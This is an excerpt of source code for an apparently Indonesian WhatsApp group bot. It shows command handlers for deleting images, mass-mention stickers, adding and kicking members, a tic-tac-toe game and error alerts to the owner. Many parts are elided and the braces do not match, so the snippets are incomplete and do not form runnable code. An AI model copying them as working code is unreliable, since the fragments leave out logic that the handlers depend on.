				case 'delimage':
				if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					try {
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, teks.trim(), extendedText, { quoted: imp, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              if (!isOwner && !imp.key.fromMe) return sticOwner(from)
				...
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await impo.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				...
				impo.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              if (!isOwner && !imp.key.fromMe) return sticOwner(from)
			...
			if (!isBotGroupAdmins) return sticNotAdmin(from)
			if (imp.message.extendedTextMessage === undefined || imp.message.extendedTextMessage === null) return reply('Reply targetnya!')
			add = imp.message.extendedTextMessage.contextInfo.participant
		    impo.groupAdd(from, [add])
			...
			if (!isBotGroupAdmins) return sticNotAdmin(from)
			if (imp.message.extendedTextMessage === undefined || imp.message.extendedTextMessage === null) return reply('Reply targetnya!')
			kick = imp.message.extendedTextMessage.contextInfo.participant
		    impo.groupRemove(from, [kick])
...
await impo.sendMessage(from, btngrass, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
			case 'addrespon':
			if (!isOwner && !imp.key.fromMe) return sticOwner(from)
...
Giliran = @${tty.player1.split('@')[0]}`
  impo.sendMessage(from, ucapan, text, {quoted: imp, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
...
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
impo.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:imp,contextInfo:{mentionedJid:[tty.player2]}})
}
}
...
${ttt}`
impo.sendMessage(from, ucapan1, text, {quoted:imp, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
...
${ttt}`
impo.sendMessage(from, ucapan1, text, {quoted:imp, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
...
Giliran = @${tty.player1.split('@')[0]}`
 impo.sendMessage(from, ucapan, text, {quoted: imp, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
     ...
     impo.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:"https://wa.me/6285774523785"}}})
	}
    }
    }
    }
